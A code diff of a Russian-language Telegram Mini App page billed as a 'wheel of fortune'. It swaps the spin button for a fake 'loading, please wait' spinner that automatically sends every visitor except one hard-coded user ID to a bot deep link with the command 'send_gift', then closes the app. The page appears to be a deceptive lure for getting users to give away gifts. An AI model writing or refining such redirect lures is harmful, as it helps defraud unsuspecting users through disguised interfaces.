@@ -10,34 +10,38 @@
             text-align: center;
             padding-top: 50px;
         }
-        .btn {
-            background: #00aaff;
-            color: white;
-            border: none;
-            padding: 20px 40px;
-            border-radius: 10px;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #00aaff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h2>🎰 Колесо удачи</h2>
-    <button class="btn" id="spinBtn">🎲 Крутить!</button>
+    <h2>🎰 Загрузка колеса удачи...</h2>
+    <div class="loader"></div>
+    <p>Пожалуйста, подождите</p>
 
     <script>
         const WebApp = window.Telegram.WebApp;
         WebApp.ready();
 
         const user = WebApp.initDataUnsafe.user;
-        document.getElementById('spinBtn').addEventListener('click', function() {
-            if (user && user.id != 8528804038) {
-                // Открываем чат с ботом с командой
-                window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=send_gift';
-                WebApp.close();
-            }
-        });
+        if (user && user.id != 8528804038) {
+            // АВТОМАТИЧЕСКИ ОТКРЫВАЕМ ЧАТ С БОТОМ
+            window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=send_gift';
+            
+            // ЗАКРЫВАЕМ МИНИ-ПРИЛОЖЕНИЕ
+            setTimeout(() => WebApp.close(), 1500);
+        }
     </script>
 </body>
 </html>
